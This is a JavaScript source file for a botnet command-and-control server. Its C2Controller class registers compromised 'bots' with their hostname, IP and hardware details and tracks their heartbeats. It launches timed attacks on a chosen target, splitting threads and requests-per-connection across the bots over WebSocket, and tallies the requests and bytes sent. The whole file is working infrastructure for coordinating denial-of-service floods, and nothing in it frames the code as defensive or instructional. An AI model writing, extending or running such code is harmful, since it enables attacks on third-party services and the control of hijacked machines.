import crypto from 'crypto';
import { logger } from '../utils/logger.js';

export class C2Controller {
    constructor(database, io) {
        this.db = database;
        this.io = io;
        this.activeBots = new Map();
        this.activeAttacks = new Map();
    }

    // ============================================
    // 🔐 AUTHENTICATION
    // ============================================
    async login(username, password) {
        // Simple authentication - you can enhance this
        const user = await this.db.getUser(username);
        
        if (!user || user.password !== this.hashPassword(password)) {
            throw new Error('Invalid credentials');
        }

        const token = this.generateToken(user);
        return token;
    }

    hashPassword(password) {
        return crypto.createHash('sha256').update(password).digest('hex');
    }

    generateToken(user) {
        const payload = {
            userId: user.id,
            username: user.username,
            timestamp: Date.now()
        };
        return Buffer.from(JSON.stringify(payload)).toString('base64');
    }

    // ============================================
    // 🤖 BOT MANAGEMENT
    // ============================================
    async registerBot(botData) {
        const bot = {
            id: botData.id || crypto.randomUUID(),
            hostname: botData.hostname,
            ip: botData.ip,
            os: botData.os,
            arch: botData.arch,
            cpus: botData.cpus,
            memory: botData.memory,
            version: botData.version,
            status: 'online',
            registeredAt: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        };

        await this.db.saveBot(bot);
        this.activeBots.set(bot.id, bot);
        
        logger.info(`🤖 New bot registered: ${bot.id} (${bot.hostname})`);
        this.io.emit('bot:registered', bot);
        
        return bot;
    }

    async getBots() {
        return await this.db.getBots();
    }

    async getBot(botId) {
        const bot = await this.db.getBot(botId);
        if (!bot) {
            throw new Error('Bot not found');
        }
        return bot;
    }

    async updateBotHeartbeat(botId, data) {
        const bot = await this.db.getBot(botId);
        if (!bot) {
            throw new Error('Bot not found');
        }

        bot.lastSeen = new Date().toISOString();
        bot.status = 'online';
        
        if (data.stats) {
            bot.stats = data.stats;
        }

        await this.db.updateBot(botId, bot);
        this.activeBots.set(botId, bot);
        
        this.io.emit('bot:heartbeat', { botId, timestamp: bot.lastSeen });
    }

    async updateBotStatus(botId, status) {
        const bot = await this.db.getBot(botId);
        if (bot) {
            bot.status = status;
            bot.lastSeen = new Date().toISOString();
            await this.db.updateBot(botId, bot);
            this.io.emit('bot:status', { botId, status });
        }
    }

    async updateBotStats(botId, stats) {
        const bot = await this.db.getBot(botId);
        if (bot) {
            bot.stats = stats;
            bot.lastSeen = new Date().toISOString();
            await this.db.updateBot(botId, bot);
        }
    }

    // ============================================
    // ⚡ ATTACK MANAGEMENT
    // ============================================
    async startAttack(attackData) {
        const attack = {
            id: crypto.randomUUID(),
            target: attackData.target,
            method: attackData.method,
            threads: attackData.threads || 100,
            duration: attackData.duration || 60,
            rpc: attackData.rpc || 1,
            botIds: attackData.botIds || [],
            status: 'starting',
            createdAt: new Date().toISOString(),
            startedAt: null,
            endedAt: null,
            stats: {
                totalRequests: 0,
                successfulRequests: 0,
                failedRequests: 0,
                bytesTransferred: 0
            }
        };

        await this.db.saveAttack(attack);
        this.activeAttacks.set(attack.id, attack);

        // Create tasks for bots
        const bots = attack.botIds.length > 0 
            ? attack.botIds 
            : Array.from(this.activeBots.keys());

        for (const botId of bots) {
            const task = {
                id: crypto.randomUUID(),
                attackId: attack.id,
                botId: botId,
                type: 'attack',
                command: {
                    action: 'start_attack',
                    target: attack.target,
                    method: attack.method,
                    threads: Math.floor(attack.threads / bots.length),
                    duration: attack.duration,
                    rpc: attack.rpc
                },
                status: 'pending',
                createdAt: new Date().toISOString()
            };

            await this.db.saveTask(task);
            
            // Notify bot via WebSocket
            this.io.to(`bot:${botId}`).emit('task:new', task);
        }

        attack.status = 'running';
        attack.startedAt = new Date().toISOString();
        await this.db.updateAttack(attack.id, attack);

        logger.info(`⚡ Attack started: ${attack.id} -> ${attack.target} (${attack.method})`);
        this.io.emit('attack:started', attack);

        // Auto-stop after duration
        setTimeout(async () => {
            await this.stopAttack(attack.id);
        }, attack.duration * 1000);

        return attack;
    }

    async stopAttack(attackId) {
        const attack = await this.db.getAttack(attackId);
        if (!attack) {
            throw new Error('Attack not found');
        }

        attack.status = 'stopped';
        attack.endedAt = new Date().toISOString();
        await this.db.updateAttack(attackId, attack);
        this.activeAttacks.delete(attackId);

        // Notify all bots to stop
        const tasks = await this.db.getTasksByAttack(attackId);
        for (const task of tasks) {
            this.io.to(`bot:${task.botId}`).emit('task:stop', { 
                taskId: task.id,
                attackId: attackId 
            });
        }

        logger.info(`⚡ Attack stopped: ${attackId}`);
        this.io.emit('attack:stopped', { attackId });
    }

    async getAttacks(filters = {}) {
        return await this.db.getAttacks(filters);
    }

    async getAttack(attackId) {
        const attack = await this.db.getAttack(attackId);
        if (!attack) {
            throw new Error('Attack not found');
        }
        return attack;
    }

    async getAttackStats(attackId) {
        const attack = await this.db.getAttack(attackId);
        if (!attack) {
            throw new Error('Attack not found');
        }

        const tasks = await this.db.getTasksByAttack(attackId);
        const stats = {
            ...attack.stats,
            totalBots: tasks.length,
            activeBots: tasks.filter(t => t.status === 'running').length,
            completedBots: tasks.filter(t => t.status === 'completed').length
        };

        return stats;
    }

    async updateAttackProgress(attackId, progress) {
        const attack = await this.db.getAttack(attackId);
        if (attack) {
            attack.stats = {
                ...attack.stats,
                ...progress
            };
            await this.db.updateAttack(attackId, attack);
        }
    }

    // ============================================
    // 🎯 TASK MANAGEMENT
    // ============================================
    async createTask(taskData) {
        const task = {
            id: crypto.randomUUID(),
            botId: taskData.botId,
            type: taskData.type,
            command: taskData.command,
            status: 'pending',
            createdAt: new Date().toISOString()
        };

        await this.db.saveTask(task);
        
        // Notify bot
        this.io.to(`bot:${task.botId}`).emit('task:new', task);
        
        return task;
    }

    async getTasks(filters = {}) {
        return await this.db.getTasks(filters);
    }

    async getBotTasks(botId) {
        return await this.db.getTasksByBot(botId);
    }

    async completeTask(taskId, result) {
        const task = await this.db.getTask(taskId);
        if (!task) {
            throw new Error('Task not found');
        }

        task.status = 'completed';
        task.completedAt = new Date().toISOString();
        task.result = result;

        await this.db.updateTask(taskId, task);
        
        // Update attack stats if this is an attack task
        if (task.attackId && result.stats) {
            const attack = await this.db.getAttack(task.attackId);
            if (attack) {
                attack.stats.totalRequests += result.stats.totalRequests || 0;
                attack.stats.successfulRequests += result.stats.successfulRequests || 0;
                attack.stats.failedRequests += result.stats.failedRequests || 0;
                attack.stats.bytesTransferred += result.stats.bytesTransferred || 0;
                await this.db.updateAttack(task.attackId, attack);
            }
        }

        this.io.emit('task:completed', { taskId, result });
    }

    // ============================================
    // 📊 STATISTICS
    // ============================================
    async getOverviewStats() {
        const bots = await this.db.getBots();
        const attacks = await this.db.getAttacks();
        
        const onlineBots = bots.filter(b => b.status === 'online').length;
        const runningAttacks = attacks.filter(a => a.status === 'running').length;
        const totalAttacks = attacks.length;
        
        const totalRequests = attacks.reduce((sum, a) => 
            sum + (a.stats?.totalRequests || 0), 0
        );

        return {
            bots: {
                total: bots.length,
                online: onlineBots,
                offline: bots.length - onlineBots
            },
            attacks: {
                total: totalAttacks,
                running: runningAttacks,
                completed: attacks.filter(a => a.status === 'stopped').length
            },
            requests: {
                total: totalRequests,
                successful: attacks.reduce((sum, a) => 
                    sum + (a.stats?.successfulRequests || 0), 0
                ),
                failed: attacks.reduce((sum, a) => 
                    sum + (a.stats?.failedRequests || 0), 0
                )
            }
        };
    }

    async getBotStats() {
        const bots = await this.db.getBots();
        return bots.map(bot => ({
            id: bot.id,
            hostname: bot.hostname,
            status: bot.status,
            lastSeen: bot.lastSeen,
            stats: bot.stats
        }));
    }
}
